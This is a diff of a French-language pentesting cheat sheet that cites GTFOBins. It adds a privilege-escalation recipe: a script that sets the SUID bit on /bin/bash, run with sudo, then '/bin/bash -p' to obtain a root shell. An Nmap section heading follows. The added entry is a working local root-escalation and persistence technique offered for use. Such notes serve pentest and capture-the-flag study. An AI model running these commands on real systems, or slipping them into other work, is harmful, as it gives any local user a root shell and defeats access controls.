@@ -1,6 +1,19 @@
 GTOBin site reference : https://gtfobins.org/#
 
 
+### /bin/bash
+```bash 
+#!/bin/bash
+chmod u+s /bin/bash
+```
+
+Le lancer en sudo 
+```bash 
+/bin/bash -p
+
+```
+
+
 ### Nmap
 ```bash
 # Indentification
